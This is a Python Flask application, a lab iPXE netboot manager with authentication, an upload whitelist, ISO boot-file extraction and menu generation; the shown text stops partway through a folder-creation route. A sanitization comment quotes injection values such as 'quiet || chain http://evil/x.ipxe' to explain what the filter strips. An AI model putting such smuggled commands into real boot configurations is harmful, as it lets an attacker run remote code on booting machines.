import os
import re
import hmac
import json
import time
import uuid
import fcntl
import pathlib
import shutil
import zipfile
import tempfile
from contextlib import contextmanager
from urllib.parse import quote

try:
    import yaml  # for validating autoinstall user-data on save
except Exception:  # pragma: no cover - degrade gracefully if PyYAML is absent
    yaml = None

try:
    import pycdlib  # for extracting kernel/initrd from uploaded ISOs
except Exception:  # pragma: no cover - uploads still work, just no extraction
    pycdlib = None

from flask import (Flask, Request, request, jsonify, render_template, Response,
                   send_file)
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 8 * 1024 * 1024 * 1024  # 8 GB

UPLOAD_DIR    = pathlib.Path(os.environ.get('UPLOAD_DIR',   '/data/uploads'))
ENTRIES_FILE  = pathlib.Path(os.environ.get('ENTRIES_FILE', '/data/state/entries.json'))
WEBFS_BASE    = os.environ.get('WEBFS_BASE', 'http://192.168.100.1:8080')
SERVER_IP     = os.environ.get('SERVER_IP',  '192.168.100.1')
# Admin account for the manager UI/API (HTTP Basic). Auth is enabled by
# setting a password; the username defaults to 'admin'.
AUTH_USER     = os.environ.get('AUTH_USER', 'admin')
AUTH_PASSWORD = os.environ.get('AUTH_PASSWORD', '')

# ── upload whitelist ─────────────────────────────────────────────────────────
# The netboot share only ever needs boot artifacts, so uploads are restricted
# to those. This is enforced HERE, in the share owner, so the rule holds for
# EVERY path into the share — the Lab Monitor proxy, the direct API, or curl —
# not just the dashboard. A front-end-only check would be trivially bypassed.
#
# Tokens are matched case-insensitively against the sanitized final filename.
# Two kinds of token:
#   * extension tokens (iso, gz, cpio) match a trailing '.<token>', so compound
#     names like 'rootfs.cpio.gz' or 'initrd.gz' are accepted on their suffix;
#   * name tokens (vmlinuz, rootfs) match kernels/root-filesystems that usually
#     carry NO extension — 'vmlinuz', 'vmlinuz-6.8.0-40-generic', 'rootfs',
#     'rootfs.squashfs', 'vmlinuz.efi' all match by name prefix.
# Override the whole set with IPXE_ALLOWED_UPLOADS="iso,gz,cpio,vmlinuz,rootfs".
# NOTE: this gates content ENTERING the share (uploads). It does not re-check
# files already present — ISO auto-extraction legitimately writes 'initrd',
# and move/rename operate on files that were admitted once already.
_NAME_TOKENS = {'vmlinuz', 'vmlinux', 'bzimage', 'linux', 'rootfs',
                'initrd', 'initramfs'}
_ALLOWED = [t.strip().lower().lstrip('.')
            for t in os.environ.get('IPXE_ALLOWED_UPLOADS',
                                    'iso,gz,cpio,vmlinuz,rootfs').split(',')
            if t.strip()]
ALLOWED_EXTS  = tuple(t for t in _ALLOWED if t not in _NAME_TOKENS)
ALLOWED_NAMES = tuple(t for t in _ALLOWED if t in _NAME_TOKENS)


def upload_allowed(filename):
    """True if `filename` (a sanitized basename) may enter the netboot share.

    Extension tokens (.iso/.gz/.cpio) match a trailing suffix. Name tokens
    (vmlinuz/rootfs) match as a SUBSTRING anywhere in the name, so vendor- or
    build-tagged artifacts like 'gb200_06v_vmlinuz', 'nvidia_vmlinuz_v2' or
    'custom-rootfs.squashfs' are all accepted — the rule is simply "the name
    contains vmlinuz / rootfs". Trade-off: this also admits e.g. 'vmlinuz.sh';
    the whitelist is a boot-area content guardrail behind the manager
    credential, not an auth boundary. Tighten via IPXE_ALLOWED_UPLOADS."""
    low = filename.lower()
    if any(low.endswith('.' + ext) for ext in ALLOWED_EXTS):
        return True
    return any(nm in low for nm in ALLOWED_NAMES)


def _upload_reject_msg():
    exts = ' '.join('.' + e for e in ALLOWED_EXTS)
    names = ' or '.join(ALLOWED_NAMES)
    parts = []
    if exts:
        parts.append(f'files ending in {exts}')
    if names:
        parts.append(f'names containing {names}')
    return 'file type not allowed for the netboot share — permitted: ' + '; '.join(parts)


# The whitelist guards the NETBOOT area only. The Lab Monitor uploads into its
# own space inside the share (MONITOR_UPLOAD_DIR, default 'monitor/…') and is a
# general-purpose file area — restricting it to boot artifacts would (wrongly)
# reject ordinary dashboard uploads. Top-level folders listed here are exempt.
# Set IPXE_WHITELIST_EXEMPT_DIRS='' to enforce the whitelist everywhere in the
# share (boot-artifacts-only, no general uploads anywhere).
WHITELIST_EXEMPT_DIRS = {d.strip().strip('/').split('/')[0].lower()
                         for d in os.environ.get('IPXE_WHITELIST_EXEMPT_DIRS',
                                                 'monitor').split(',')
                         if d.strip()}


def _whitelist_applies(sub, general=False):
    """Whether the upload whitelist should gate an upload targeting share-
    relative folder `sub` ('' = share root).

    The whitelist guards the iPXE NETBOOT area only. An upload is exempt when
    EITHER the caller explicitly marks it a general-purpose upload (the Lab
    Monitor does this for every dashboard upload, so it never depends on folder
    names matching), OR its top-level folder is a configured general area
    (IPXE_WHITELIST_EXEMPT_DIRS). Both routes require the manager credential,
    so this is a content guardrail for the boot area, not an auth boundary."""
    if general:
        return False
    top = sub.split('/', 1)[0].lower() if sub else ''
    return top not in WHITELIST_EXEMPT_DIRS

# Autoinstall (cloud-init NoCloud) profiles: where they are stored and the base
# URL PXE clients use to fetch the seed. MANAGER_BASE must point at THIS service
# (default: the manager's own host:port) because it serves /autoinstall/<id>/.
AUTOINSTALL_FILE = pathlib.Path(
    os.environ.get('AUTOINSTALL_FILE', str(ENTRIES_FILE.parent / 'autoinstall.json')))
MANAGER_PORT = os.environ.get('MANAGER_PORT', '8091')
MANAGER_BASE = os.environ.get('MANAGER_BASE', f'http://{SERVER_IP}:{MANAGER_PORT}').rstrip('/')


class UploadsSpoolRequest(Request):
    """Spool multipart file parts straight into UPLOAD_DIR while they upload.

    Werkzeug's default spools them to the container's /tmp, so an 8 GB ISO
    would need 8 GB of scratch space in the overlay filesystem on top of its
    final copy in the share. Landing in UPLOAD_DIR (the big bind-mounted disk)
    avoids that, and lets api_upload() rename the finished spool into place
    instead of copying it a second time. The '.spool-' dotfile prefix keeps
    half-received files out of the file listing.
    """
    def _get_file_stream(self, total_content_length, content_type,
                         filename=None, content_length=None):
        UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
        fd, path = tempfile.mkstemp(prefix='.spool-', dir=UPLOAD_DIR)
        os.close(fd)
        os.chmod(path, 0o644)          # mkstemp's 0600 would be unreadable to webfs
        return open(path, 'wb+')       # .name == path so the route can rename it


app.request_class = UploadsSpoolRequest


def _spool_path(file_storage):
    """The on-disk spool behind an uploaded part, if it lives in UPLOAD_DIR."""
    name = getattr(file_storage.stream, 'name', None)
    if isinstance(name, str) and pathlib.Path(name).parent == UPLOAD_DIR:
        return pathlib.Path(name)
    return None


def _reap_stale_spools(max_age=86400):
    """Remove spool files orphaned by crashed/aborted uploads."""
    try:
        cutoff = time.time() - max_age
        for p in UPLOAD_DIR.glob('.spool-*'):
            if p.stat().st_mtime < cutoff:
                p.unlink(missing_ok=True)
    except Exception:
        pass

# ── optional auth (everything except the PXE-facing menu endpoint) ──────────

# Brute-force throttle: after LOGIN_FAIL_LIMIT wrong passwords from one IP in
# LOGIN_FAIL_WINDOW seconds, that IP gets 429 until the window rolls over.
# Counters are per worker process (effective budget = workers x limit).
LOGIN_FAIL_LIMIT  = int(os.environ.get('LOGIN_FAIL_LIMIT', '10'))
LOGIN_FAIL_WINDOW = int(os.environ.get('LOGIN_FAIL_WINDOW', '900'))
_auth_fails = {}


@app.before_request
def _require_auth():
    # PXE clients fetch the menu and the autoinstall seed with no credentials,
    # so those stay open even when a password protects the manager UI/API.
    # (Management lives under /api/autoinstall, which is NOT exempted here.)
    if (not AUTH_PASSWORD or request.path == '/menu.ipxe'
            or request.path.startswith('/autoinstall/')):
        return None
    ip = request.remote_addr or ''
    now = time.time()
    hits = [t for t in _auth_fails.get(ip, []) if now - t < LOGIN_FAIL_WINDOW]
    if len(hits) >= LOGIN_FAIL_LIMIT:
        _auth_fails[ip] = hits
        return Response('Too many failed attempts — try again later.\n', 429,
                        mimetype='text/plain')
    auth = request.authorization
    # constant-time comparison of both parts of the admin account
    if (auth is not None
            and hmac.compare_digest((auth.username or '').encode(), AUTH_USER.encode())
            and hmac.compare_digest((auth.password or '').encode(), AUTH_PASSWORD.encode())):
        _auth_fails.pop(ip, None)
        return None
    if auth is not None:      # only count actual wrong passwords, not the
        hits.append(now)      # browser's initial credential-less request
        _auth_fails[ip] = hits
        app.logger.warning('failed auth attempt from %s (%d/%d)',
                           ip, len(hits), LOGIN_FAIL_LIMIT)
    return Response('Authentication required.', 401,
                    {'WWW-Authenticate': 'Basic realm="iPXE Manager"'})


@app.after_request
def _security_headers(resp):
    resp.headers.setdefault('X-Content-Type-Options', 'nosniff')
    resp.headers.setdefault('X-Frame-Options', 'DENY')
    resp.headers.setdefault('Referrer-Policy', 'no-referrer')
    return resp

# ── persistence ──────────────────────────────────────────────────────────────

def load_entries():
    if not ENTRIES_FILE.exists() or ENTRIES_FILE.stat().st_size == 0:
        return []
    try:
        entries = json.loads(ENTRIES_FILE.read_text())
        # The ISO sanboot type was removed (BIOS-only — useless on UEFI, where
        # kernel+initrd with the ISO's URL is the way). Filter any legacy
        # entries so they never reach the menu; the next save purges them.
        return [e for e in entries if e.get('type') != 'iso']
    except Exception:
        # Corrupt JSON: preserve it instead of silently returning [] (a following
        # mutation would then persist the empty list and destroy the entries).
        try:
            ENTRIES_FILE.replace(ENTRIES_FILE.with_suffix('.json.corrupt'))
            app.logger.error('entries.json was invalid JSON; moved aside to %s',
                             ENTRIES_FILE.with_suffix('.json.corrupt'))
        except Exception:
            pass
        return []

def save_entries(entries):
    # ENTRIES_FILE lives on a directory bind mount, so tmp+rename is atomic
    # and visible on the host (renaming onto a single-file mount would EBUSY).
    # Unique temp name so two concurrent writers never share a tmp file.
    ENTRIES_FILE.parent.mkdir(parents=True, exist_ok=True)
    tmp = ENTRIES_FILE.with_name(f'.entries.{uuid.uuid4().hex}.tmp')
    tmp.write_text(json.dumps(entries, indent=2))
    tmp.replace(ENTRIES_FILE)


def load_profiles():
    if not AUTOINSTALL_FILE.exists() or AUTOINSTALL_FILE.stat().st_size == 0:
        return []
    try:
        return json.loads(AUTOINSTALL_FILE.read_text())
    except Exception:
        return []

def save_profiles(profiles):
    AUTOINSTALL_FILE.parent.mkdir(parents=True, exist_ok=True)
    tmp = AUTOINSTALL_FILE.with_name(f'.autoinstall.{uuid.uuid4().hex}.tmp')
    tmp.write_text(json.dumps(profiles, indent=2))
    tmp.replace(AUTOINSTALL_FILE)


@contextmanager
def entries_lock():
    # Serializes read-modify-write across gunicorn's 2 processes x 8 threads;
    # a threading.Lock would only cover one process. fcntl is fine on Linux.
    ENTRIES_FILE.parent.mkdir(parents=True, exist_ok=True)
    lockfile = ENTRIES_FILE.with_name('.entries.lock')
    with open(lockfile, 'w') as lf:
        fcntl.flock(lf, fcntl.LOCK_EX)
        try:
            yield
        finally:
            fcntl.flock(lf, fcntl.LOCK_UN)

# ── input sanitization ───────────────────────────────────────────────────────

_CTRL = re.compile(r'[\x00-\x1f\x7f]')
# iPXE splits a line into separate commands on these tokens, so a value like
# "quiet || chain http://evil/x.ipxe" on the kernel line, or "Ubuntu && shell"
# on an item line, would execute injected commands during menu construction.
_IPXE_SEP = re.compile(r'\|\||&&|;')

def _clean(value, maxlen=200):
    v = _CTRL.sub(' ', str(value))
    v = _IPXE_SEP.sub(' ', v)
    return v.strip()[:maxlen]

def _safe_component(name):
    """Validate ONE path component (a file or folder name), PRESERVING it byte
    for byte. Only the leaf is kept if a path slips in. Returns '' if unsafe."""
    name = str(name).replace('\\', '/').rsplit('/', 1)[-1]
    if name in ('', '.', '..') or _CTRL.search(name):
        return ''
    if len(name.encode('utf-8', 'surrogatepass')) > 255:   # ext4/xfs name limit
        return ''
    return name


def _safe_relpath(value):
    """Validate a webfs-relative path like 'Ubuntu 24.04/vmlinuz', PRESERVING
    every name exactly — spaces, Unicode, mixed case, parentheses and interior
    dots are all kept verbatim (uploads must land under their real names). Only
    genuinely unsafe paths are rejected, by returning '': absolute paths,
    '.'/'..'/empty components, embedded NUL/control characters, or a component
    over 255 bytes. Splitting is on '/' only; a literal backslash is a valid
    POSIX filename character and is preserved. Leading/trailing/duplicate
    slashes collapse (this normalizes separators, it never renames a name)."""
    out = []
    for p in str(value).split('/'):
        if p == '':
            continue
        if p in ('.', '..') or _CTRL.search(p):
            return ''
        if len(p.encode('utf-8', 'surrogatepass')) > 255:
            return ''
        out.append(p)
    return '/'.join(out)

def sanitize_fields(data):
    """Whitelist, clean and validate entry fields. Returns (fields, error)."""
    out = {}
    if 'name' in data:
        name = _clean(data['name'])
        if not name:
            return None, 'name must not be empty'
        out['name'] = name
    if 'type' in data:
        # 'iso' (sanboot) is gone: BIOS-only, cannot work on UEFI — ISOs boot
        # via kernel+initrd with the ISO's HTTP URL on the command line instead
        if data['type'] not in ('kernel', 'chain'):
            return None, 'type must be kernel or chain'
        out['type'] = data['type']
    if 'enabled' in data:
        out['enabled'] = bool(data['enabled'])
    for k in ('kernel', 'initrd'):
        if k in data:
            # relative paths allowed: extracted ISO boot files live in a
            # per-ISO subfolder (e.g. 'ubuntu-24.04-live-server-amd64/vmlinuz')
            fn = _safe_relpath(data[k]) if data[k] else ''
            if data[k] and not fn:
                return None, f'invalid {k} filename'
            # names are now preserved verbatim, so a boot-entry path could carry
            # iPXE command separators. file_url() percent-encodes them in the
            # menu, but reject them here too — a real kernel/initrd never has one
            if fn and _IPXE_SEP.search(fn):
                return None, f'{k} filename may not contain | ; or &'
            out[k] = fn
    if 'cmdline' in data:
        out['cmdline'] = _clean(data['cmdline'], 500)
    if 'url' in data:
        url = _clean(data['url'], 500)
        if url and not re.fullmatch(r'https?://\S+', url):
            return None, 'url must be http(s):// with no spaces'
        out['url'] = url
    if 'autoinstall' in data:
        # reference to an autoinstall profile id (validated against the store at
        # menu-generation time); the seed string itself is built server-side so
        # the required ';' in ds=nocloud-net;s=... never passes through _clean
        ai = str(data['autoinstall'] or '')
        if ai and not re.fullmatch(r'[A-Za-z0-9]{1,40}', ai):
            return None, 'invalid autoinstall profile id'
        out['autoinstall'] = ai
    return out, None

# ── file helpers ─────────────────────────────────────────────────────────────

def file_url(name):
    return f'{WEBFS_BASE}/files/{quote(name)}'   # quote() keeps '/' intact

def list_files():
    result = []
    if UPLOAD_DIR.exists():
        # recurse so the boot files extracted into per-ISO subfolders
        # ('<iso-name>/vmlinuz') show up in the UI and datalists
        for f in sorted(UPLOAD_DIR.rglob('*')):
            rel = f.relative_to(UPLOAD_DIR)
            # dotfiles include .<name>.uploading partials — never show them
            if not f.is_file() or any(p.startswith('.') for p in rel.parts):
                continue
            name = rel.as_posix()
            result.append({
                'name': name,
                'size': f.stat().st_size,
                'url':  file_url(name),
            })
    return result

# ── ISO boot-file extraction ─────────────────────────────────────────────────
# UEFI firmware cannot sanboot an ISO, but every mainstream installer ISO
# carries a PXE-bootable kernel + initrd. On upload we pull that pair out into
# UPLOAD_DIR/<iso-stem>/ so a "Kernel + initrd" entry can boot it directly:
#   kernel .../files/<stem>/vmlinuz ip=dhcp url=.../files/<iso>   (casper
#   fetches the ISO itself over HTTP — no sanboot involved).

_KERNEL_NAME = re.compile(r'^(vmlinuz|vmlinux|bzimage|linux)([.\-].*)?$')
_INITRD_NAME = re.compile(r'^(initrd|initramfs)([.\-].*)?$')
# where distros keep the netboot pair; tried in this order when several
# directories qualify (Ubuntu/Debian-live, Debian d-i, Fedora/RHEL, openSUSE, Arch)
_BOOT_DIR_PREFERENCE = ('casper', 'live', 'install.amd', 'install',
                        'images/pxeboot', 'boot/x86_64/loader', 'arch/boot/x86_64')
# never treat package archives or firmware blobs as boot files
_EXTRACT_SKIP_DIRS = ('pool', 'dists')
_EXTRACT_SKIP_EXT  = ('.deb', '.udeb', '.rpm', '.efi', '.sig', '.mod', '.c32')

def extract_boot_files(iso_path, dest_dir):
    """Best-effort: copy the kernel + initrd out of a distro ISO into dest_dir.

    Scans the ISO for a directory holding both a kernel (vmlinuz/linux/bzImage)
    and an initrd (initrd*/initramfs*) and extracts that pair. Returns
    {'kernel': <basename>, 'initrd': <basename>} on success, else None —
    any parse failure leaves the upload itself untouched.
    """
    if pycdlib is None:
        return None
    iso = pycdlib.PyCdlib()
    try:
        iso.open(str(iso_path))
    except Exception:
        app.logger.warning('%s: not a readable ISO9660 image, skipping extraction',
                           iso_path.name)
        return None
    try:
        # richest name facade available (plain ISO9660 mangles to 'VMLINUZ.;1')
        if iso.has_udf():          kw = 'udf_path'
        elif iso.has_rock_ridge(): kw = 'rr_path'
        elif iso.has_joliet():     kw = 'joliet_path'
        else:                      kw = 'iso_path'
        dirs = {}
        for dirpath, _subdirs, files in iso.walk(**{kw: '/'}):
            rel = dirpath.strip('/')
            if rel.split('/', 1)[0].lower() in _EXTRACT_SKIP_DIRS:
                continue  # apt/yum trees are full of linux-*.deb false positives
            for fn in files:
                name = fn.split(';')[0].rstrip('.') if kw == 'iso_path' else fn
                base = name.lower()
                if base.endswith(_EXTRACT_SKIP_EXT):
                    continue
                bucket = dirs.setdefault(rel, {'kernel': [], 'initrd': []})
                if _KERNEL_NAME.match(base):
                    bucket['kernel'].append((fn, name))
                elif _INITRD_NAME.match(base):
                    bucket['initrd'].append((fn, name))

        candidates = [d for d, b in dirs.items() if b['kernel'] and b['initrd']]
        if not candidates:
            return None

        def dir_rank(d):
            dl = d.lower()
            for i, pref in enumerate(_BOOT_DIR_PREFERENCE):
                if dl == pref or dl.endswith('/' + pref):
                    return i
            return len(_BOOT_DIR_PREFERENCE) + dl.count('/')
        best = min(candidates, key=dir_rank)
        # shortest name wins: 'vmlinuz' over 'vmlinuz.efi', 'initrd' over
        # 'initrd.lz', 'initramfs-linux.img' over the -fallback variant
        pick = lambda cands: min(cands, key=lambda t: len(t[1]))

        dest_dir.mkdir(parents=True, exist_ok=True)
        out = {}
        for (fn, name), key in ((pick(dirs[best]['kernel']), 'kernel'),
                                (pick(dirs[best]['initrd']), 'initrd')):
            src = '/' + (best + '/' if best else '') + fn
            safe = secure_filename(name) or key
            # hidden temp name: webfs must never serve a half-written boot file
            tmp = dest_dir / f'.{safe}.{uuid.uuid4().hex}.extracting'
            try:
                iso.get_file_from_iso(str(tmp), **{kw: src})
                tmp.replace(dest_dir / safe)
            finally:
                tmp.unlink(missing_ok=True)
            out[key] = safe
        app.logger.info('%s: extracted %s from /%s', iso_path.name,
                        ' + '.join(out.values()), best)
        return out
    except Exception:
        app.logger.exception('boot-file extraction failed for %s', iso_path.name)
        return None
    finally:
        try:
            iso.close()
        except Exception:
            pass

# ── iPXE menu generator ───────────────────────────────────────────────────────

def entry_body_lines(e):
    """The iPXE commands that boot a single entry (no label, no trailing goto).
    Kernel+initrd over HTTP works on UEFI and BIOS alike."""
    t = e.get('type', 'kernel')
    lines = []
    if t == 'kernel':
        kernel  = e.get('kernel', '')
        initrd  = e.get('initrd', '')
        cmdline = e.get('cmdline', '')
        # args go on the kernel line so no imgargs name-matching is needed.
        # modern kernels locate the initrd via an 'initrd=<name>' argument on
        # the command line (not just the iPXE 'initrd' fetch), so add it — the
        # basename matches how iPXE registers the downloaded file.
        args = []
        if initrd:
            args.append(f'initrd={pathlib.Path(initrd).name}')
        if cmdline:
            args.append(cmdline)
        # Attach an autoinstall (cloud-init NoCloud) seed when the entry points
        # at a profile. Built here (not via user input) so the ';' survives.
        ai = e.get('autoinstall')
        if ai:
            args.append(f'autoinstall ds=nocloud-net;s={MANAGER_BASE}/autoinstall/{ai}/')
        arg_str = (' ' + ' '.join(args)) if args else ''
        # every fetch needs '|| goto failed' — iPXE aborts the whole script
        # on the first unhandled command failure (e.g. a deleted file 404s)
        lines.append(f'kernel {file_url(kernel)}{arg_str} || goto failed')
        if initrd:
            lines.append(f'initrd {file_url(initrd)} || goto failed')
        lines.append('boot || goto failed')
    elif t == 'chain':
        lines.append(f'chain {e.get("url", "")} || goto failed')
    return lines

def generate_menu(entries):
    enabled = [e for e in entries if e.get('enabled', True)]
    default = enabled[0]['id'] if enabled else 'shell'

    lines = [
        '#!ipxe',
        ':start',
        'menu Lab PXE Boot Menu',
        'item --gap -- ---- Boot Options ----',
    ]
    for e in enabled:
        # flag unattended installs in the visible menu — they wipe the target disk
        label = e['name'] + ('  [AUTOINSTALL — ERASES DISK]' if e.get('autoinstall') else '')
        lines.append(f"item {e['id']:<12} {label}")
    lines += [
        'item --gap --',
        'item shell        iPXE Shell',
        'item exit         Exit to BIOS/UEFI',
        f'choose --default {default} --timeout 30000 target && goto ${{target}} || goto exit',
    ]

    for e in enabled:
        lines.append(f'\n:{e["id"]}')
        lines += entry_body_lines(e)
        # a returned/failed boot must not fall through into the next section
        lines.append('goto start')

    lines += [
        '\n:failed',
        'echo Boot failed — returning to menu in 5 seconds',
        'sleep 5',
        'goto start',
        '\n:shell',
        "echo Type 'exit' to return to the menu",
        'shell',
        'goto start',
        '\n:exit',
        'exit',
    ]
    return '\n'.join(lines) + '\n'

# ── routes ───────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    return render_template('index.html', webfs_base=WEBFS_BASE, server_ip=SERVER_IP)

@app.route('/menu.ipxe')
def menu_ipxe():
    return Response(generate_menu(load_entries()), mimetype='text/plain')

@app.route('/api/preview', methods=['GET'])
def api_preview():
    return Response(generate_menu(load_entries()), mimetype='text/plain')

@app.route('/api/config', methods=['GET'])
def api_config():
    # lets the UI show the fixed base URL as a locked prefix so the operator
    # only ever edits the filename, never the path
    return jsonify({'webfs_base': WEBFS_BASE, 'files_base': f'{WEBFS_BASE}/files/',
                    'server_ip': SERVER_IP})

@app.route('/api/preview_entry', methods=['POST'])
def api_preview_entry():
    # authoritative single-entry preview: same sanitize + generator the real
    # menu uses, so the editor shows exactly what a client will receive
    fields, err = sanitize_fields(request.get_json(force=True) or {})
    if err:
        return jsonify({'error': err, 'lines': []}), 200
    entry = {'id': 'e' + ('0' * 7), 'type': 'kernel', 'enabled': True}
    entry.update(fields)
    return jsonify({'lines': entry_body_lines(entry), 'error': None})

# files

@app.route('/api/files', methods=['GET'])
def api_files():
    return jsonify(list_files())

@app.route('/api/files', methods=['POST'])
def api_upload():
    # touching request.files parses the multipart body; file parts stream to
    # unique '.spool-*' names inside UPLOAD_DIR (see UploadsSpoolRequest), so
    # webfs never sees a half-written file under its final name
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    f = request.files['file']
    _reap_stale_spools()
    spool = _spool_path(f)

    def _discard_and_fail(msg):
        if spool:
            f.stream.close()
            spool.unlink(missing_ok=True)
        return jsonify({'error': msg}), 400

    filename = _safe_component(f.filename or '')
    if not filename:
        return _discard_and_fail('Invalid filename')
    # optional target folder inside the share, possibly nested (?dir=monitor,
    # ?dir=monitor/netboot/efi — the Lab Monitor uploads into its own space
    # and recreates uploaded folder structures this way); every path component
    # is sanitized, so '..' and hidden/absolute components can never survive
    raw_dir = request.args.get('dir', '')
    sub = _safe_relpath(raw_dir) if raw_dir else ''
    if raw_dir and not sub:
        return _discard_and_fail('Invalid dir')
    # enforce the boot-artifact whitelist on the sanitized name — but ONLY for
    # the netboot area. General-purpose uploads (the Lab Monitor marks its own
    # with ?general=1 / X-Upload-General, or anything under an exempt folder)
    # accept any type. Checked before any folder is created or the spool is
    # renamed into place.
    general = (request.args.get('general', '') in ('1', 'true', 'yes')
               or request.headers.get('X-Upload-General', '') in ('1', 'true', 'yes'))
    if _whitelist_applies(sub, general) and not upload_allowed(filename):
        return _discard_and_fail(_upload_reject_msg())
    base = UPLOAD_DIR / sub if sub else UPLOAD_DIR
    relbase = f'{sub}/' if sub else ''          # prefix for share-relative paths
    base.mkdir(parents=True, exist_ok=True)
    dest = base / filename
    try:
        if spool:
            # already fully written to the destination filesystem — rename
            # into place, no second copy
            f.stream.close()
            spool.replace(dest)
        else:  # foreign stream (e.g. a test client): fall back to save+rename
            tmp = base / f'.{filename}.{uuid.uuid4().hex}.uploading'
            try:
                f.save(str(tmp))
                tmp.replace(dest)
            except Exception:
                tmp.unlink(missing_ok=True)
                raise
    except Exception as exc:
        return jsonify({'error': f'Upload failed: {exc}'}), 500

    # An uploaded ISO becomes bootable automatically: kernel+initrd are
    # extracted into <base>/<stem>/ and a "Kernel + initrd" entry (works on
    # UEFI and BIOS) is created whose command line hands the OS the ISO's HTTP
    # URL (ip=dhcp url=…). The entry starts disabled, so the boot menu never
    # changes until you enable it. ISOs with no recognizable kernel+initrd pair
    # get no entry (sanboot was removed — BIOS-only, it cannot work on UEFI).
    # Bare kernels can't be auto-added — they need a matching initrd and cmdline.
    kernel_entry = extracted = None
    if filename.lower().endswith('.iso'):
        stem = pathlib.Path(filename).stem
        extracted = extract_boot_files(dest, base / stem)
        if extracted:
            with entries_lock():
                entries = load_entries()
                kpath = f'{relbase}{stem}/{extracted["kernel"]}'
                if not any(e.get('type') == 'kernel' and e.get('kernel') == kpath
                           for e in entries):
                    kernel_entry = {
                        'id': 'e' + uuid.uuid4().hex[:7],
                        'name': f'{stem} (kernel+initrd)',
                        'type': 'kernel',
                        'kernel': kpath,
                        'initrd': f'{relbase}{stem}/{extracted["initrd"]}',
                        # casper/subiquity fetch the ISO itself over HTTP;
                        # adjust for other distros (inst.repo=, fetch=, …)
                        'cmdline': f'ip=dhcp url={file_url(relbase + filename)}',
                        'enabled': False,
                    }
                    entries.append(kernel_entry)
                    save_entries(entries)

    stem = pathlib.Path(filename).stem
    return jsonify({'name': relbase + filename, 'size': dest.stat().st_size,
                    'url': file_url(relbase + filename),
                    'kernel_entry': kernel_entry,
                    'extracted': extracted and {
                        'folder': f'{relbase}{stem}',
                        'kernel_url': file_url(f'{relbase}{stem}/{extracted["kernel"]}'),
                        'initrd_url': file_url(f'{relbase}{stem}/{extracted["initrd"]}'),
                    }}), 201

# ── folder download (streaming ZIP) ─────────────────────────────────────────

class _ZipStreamBuffer:
    """Unseekable write sink for ZipFile that hands finished bytes to a
    generator. No seek() on purpose: ZipFile then writes data descriptors
    instead of rewinding, so the archive can stream without ever existing
    as a whole — on disk or in RAM. tell() is required for offsets."""
    def __init__(self):
        self._chunks = []
        self._pos = 0

    def write(self, data):
        self._chunks.append(bytes(data))
        self._pos += len(data)
        return len(data)

    def tell(self):
        return self._pos

    def flush(self):
        pass

    def drain(self):
        out = b''.join(self._chunks)
        self._chunks.clear()
        return out


def _iter_zip(base, top):
    """Yield a ZIP of every visible file under base, with entries rooted at
    top/ (so extraction recreates the folder). Files are copied in 64 KiB
    chunks — a multi-GB ISO never sits in memory — and stay ZIP_STORED:
    ISOs/initrds are already compressed, so deflating would only burn CPU."""
    buf = _ZipStreamBuffer()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED, allowZip64=True) as zf:
        for f in sorted(base.rglob('*')):
            rel = f.relative_to(base)
            # skip .spool-* / .*.uploading partials and other dotfiles, like the listing does
            if not f.is_file() or any(p.startswith('.') for p in rel.parts):
                continue
            info = zipfile.ZipInfo.from_file(f, f'{top}/{rel.as_posix()}')
            with open(f, 'rb') as src, zf.open(info, 'w') as dst:
                while True:
                    chunk = src.read(1 << 16)
                    if not chunk:
                        break
                    dst.write(chunk)
                    data = buf.drain()
                    if data:
                        yield data
            data = buf.drain()
            if data:
                yield data
    tail = buf.drain()   # central directory, written on ZipFile close
    if tail:
        yield tail


@app.route('/api/files/download/<path:filename>')
def api_download_file(filename):
    """Serve one share file with Content-Disposition: attachment. webfs picks
    the Content-Type by extension and renders unknown ones (.run, .sh, ...)
    inline as text — this endpoint exists so the Lab Monitor's Download
    button always saves the file, whatever its type. conditional=True gives
    Range support, so big downloads are resumable."""
    rel = _safe_relpath(filename)
    if not rel:
        return jsonify({'error': 'Invalid path'}), 400
    path = UPLOAD_DIR / rel
    if not path.is_file():
        return jsonify({'error': 'Not found'}), 404
    return send_file(path, as_attachment=True,
                     download_name=pathlib.PurePosixPath(rel).name,
                     conditional=True)


@app.route('/api/files/archive')
def api_archive():
    """Stream a whole share folder as <folder>.zip (?dir=monitor/netboot).
    Used by the Lab Monitor's per-folder Download button."""
    rel = _safe_relpath(request.args.get('dir', ''))
    if not rel:
        return jsonify({'error': 'Invalid or missing dir'}), 400
    base = UPLOAD_DIR / rel
    if not base.is_dir():
        return jsonify({'error': 'Not found'}), 404
    top = pathlib.PurePosixPath(rel).name
    return Response(_iter_zip(base, top), mimetype='application/zip',
                    headers={'Content-Disposition': f'attachment; filename="{top}.zip"'})


def _within_share(p):
    """Belt-and-braces containment: p (which need not exist yet) must resolve
    to UPLOAD_DIR or somewhere beneath it. _safe_relpath already blocks
    traversal at the string level; this catches anything that slips past,
    including symlinked parents."""
    try:
        rp = p.resolve()
    except Exception:
        return False
    base = UPLOAD_DIR.resolve()
    return rp == base or rp.is_relative_to(base)


def _rewrite_entry_paths(old_rel, new_rel):
    """After a move/rename, keep auto-created boot entries valid by rewriting
    kernel/initrd paths that referenced the old location (exact file, or any
    file beneath a moved folder)."""
    changed = False
    with entries_lock():
        entries = load_entries()
        for e in entries:
            for k in ('kernel', 'initrd'):
                v = e.get(k) or ''
                if v == old_rel:
                    e[k] = new_rel
                    changed = True
                elif v.startswith(old_rel + '/'):
                    e[k] = new_rel + v[len(old_rel):]
                    changed = True
        if changed:
            save_entries(entries)
    return changed


def _prune_dangling_entries():
    """Drop kernel entries whose kernel file no longer exists in the share
    (e.g. after a recursive folder delete removed the ISO's boot files)."""
    with entries_lock():
        entries = load_entries()
        kept = [e for e in entries
                if e.get('type') != 'kernel' or not e.get('kernel')
                or (UPLOAD_DIR / e['kernel']).is_file()]
        if len(kept) != len(entries):
            save_entries(kept)


@app.route('/api/folders', methods=['POST'])
def api_mkdir():
    """Create an empty folder in the share. Body: {dir?: parent, name: leaf}."""
    d = request.get_json(silent=True) or {}
    raw_parent = d.get('dir', '') or ''
    parent = _safe_relpath(raw_parent) if raw_parent else ''
    if raw_parent and not parent:
        return jsonify({'error': 'Invalid dir'}), 400
    name = _safe_relpath(d.get('name', '') or '')
